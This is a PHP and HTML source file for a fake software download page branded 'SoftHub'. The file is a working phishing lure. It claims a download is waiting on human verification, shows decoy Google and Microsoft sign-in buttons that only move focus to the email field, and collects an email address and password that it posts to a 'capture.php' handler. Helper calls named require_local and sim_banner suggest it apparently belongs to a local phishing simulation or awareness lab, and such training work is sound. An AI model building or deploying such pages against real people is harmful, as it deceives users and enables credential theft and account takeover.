<?php
require __DIR__ . '/lib.php';
require_local();
$app  = isset($_GET['app'])  ? substr($_GET['app'], 0, 60)  : 'software';
$name = isset($_GET['name']) ? substr($_GET['name'], 0, 80) : 'Your software';
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Downloading <?= e($name) ?> — SoftHub</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root{--blue:#1a73e8}
  body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:#eef3f9;color:#16202e;min-height:100vh;
    display:flex;align-items:center;justify-content:center;padding:30px 16px 64px}
  .wrap{width:100%;max-width:760px;display:grid;grid-template-columns:1fr 360px;gap:18px}
  .panel{background:#fff;border:1px solid #e1e8f1;border-radius:16px;padding:26px;box-shadow:0 20px 50px -30px rgba(20,50,90,.4)}
  .dl .top{display:flex;align-items:center;gap:14px;margin-bottom:18px}
  .dl .ic{width:58px;height:58px;border-radius:14px;background:#f3f6fb;border:1px solid #e9eef6;display:grid;place-items:center;flex:none}
  .dl .ic img{width:38px;height:38px}
  .dl h1{font-size:19px}.dl .sub{font-size:12.5px;color:#7689a3;margin-top:3px}
  .ready{display:flex;align-items:center;gap:8px;color:#16a34a;font-size:13px;font-weight:600;margin-bottom:8px}
  .pbar{height:8px;border-radius:6px;background:#e6edf6;overflow:hidden;margin-bottom:7px}
  .pbar i{display:block;height:100%;width:100%;background:linear-gradient(90deg,#1a73e8,#34c0eb)}
  .pmeta{font-size:11.5px;color:#8395ad;display:flex;justify-content:space-between;margin-bottom:18px}
  .lock{display:flex;gap:11px;background:#fff8e6;border:1px solid #ffe6a8;border-radius:11px;padding:12px 14px;font-size:12.5px;color:#7a5b00;line-height:1.5}
  .lock svg{width:18px;height:18px;flex:none;color:#c98a00}
  /* sign-in card */
  .auth h2{font-size:16px;margin-bottom:3px}
  .auth .as{font-size:12.5px;color:#7689a3;margin-bottom:16px}
  .sso{display:flex;flex-direction:column;gap:9px;margin-bottom:14px}
  .sso button{display:flex;align-items:center;justify-content:center;gap:10px;border:1px solid #dadce0;background:#fff;
    border-radius:9px;font-size:13.5px;font-weight:600;padding:10px;cursor:pointer;color:#3c4043}
  .sso button:hover{background:#f7f9fc}
  .sso img{width:17px;height:17px}
  .or{display:flex;align-items:center;gap:10px;color:#9aa7ba;font-size:11.5px;margin:4px 0 12px}
  .or::before,.or::after{content:"";flex:1;height:1px;background:#e4eaf2}
  label.f{display:block;font-size:12px;color:#52637b;margin:10px 0 5px;font-weight:600}
  .inp{width:100%;height:44px;border:1px solid #d4dce8;border-radius:9px;padding:0 13px;font-size:14px;outline:none}
  .inp:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(26,115,232,.12)}
  .go{margin-top:16px;width:100%;background:var(--blue);color:#fff;border:none;border-radius:9px;font-size:14px;font-weight:700;
    padding:12px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
  .go:hover{background:#1666d0}.go svg{width:16px;height:16px}
  .err{display:none;color:#d93025;font-size:12px;margin-top:8px}
  .fine{font-size:10.5px;color:#9aa7ba;margin-top:12px;line-height:1.5;text-align:center}
  @media(max-width:680px){.wrap{grid-template-columns:1fr}}
</style>
</head>
<body>
  <div class="wrap">
    <div class="panel dl">
      <div class="top">
        <div class="ic"><img src="https://cdn.simpleicons.org/<?= e($app) ?>" alt="" onerror="this.style.display='none'" /></div>
        <div><h1><?= e($name) ?></h1><div class="sub">Official installer · 64‑bit · Windows / macOS / Linux</div></div>
      </div>
      <div class="ready"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6 9 17l-5-5"/></svg>Your download is ready</div>
      <div class="pbar"><i></i></div>
      <div class="pmeta"><span>Waiting for verification…</span><span>0 KB / 64 MB</span></div>
      <div class="lock">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
        <div>To keep downloads free of bots and abuse, please sign in to confirm you're human before the file starts. It's quick and free.</div>
      </div>
    </div>

    <div class="panel auth">
      <h2>One quick step</h2>
      <div class="as">Sign in to start your free download.</div>
      <form id="frm" method="post" action="capture.php">
        <input type="hidden" name="app" value="<?= e($app) ?>" />
        <input type="hidden" name="appname" value="<?= e($name) ?>" />
        <div class="sso">
          <button type="button" onclick="focusEmail()"><img src="https://cdn.simpleicons.org/google" alt="" />Continue with Google</button>
          <button type="button" onclick="focusEmail()"><img src="https://cdn.simpleicons.org/microsoft" alt="" />Continue with Microsoft</button>
        </div>
        <div class="or">or sign in with email</div>
        <label class="f">Email address</label>
        <input class="inp" type="email" name="email" id="email" placeholder="you@example.com" autocomplete="username" />
        <label class="f">Password</label>
        <input class="inp" type="password" name="password" id="password" placeholder="••••••••" autocomplete="current-password" />
        <div class="err" id="err">Please enter your email and password to continue.</div>
        <button class="go" type="submit"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12M7 10l5 5 5-5M5 21h14"/></svg>Sign in &amp; Download</button>
        <div class="fine">By continuing you agree to the SoftHub Terms. Your download will begin automatically after sign‑in.</div>
      </form>
    </div>
  </div>

  <script>
    function focusEmail(){ document.getElementById('email').focus(); }
    document.getElementById('frm').addEventListener('submit',function(ev){
      var em=document.getElementById('email').value.trim(), pw=document.getElementById('password').value;
      if(!em || !pw){ ev.preventDefault(); document.getElementById('err').style.display='block'; }
    });
  </script>
  <?= sim_banner() ?>
</body>
</html>
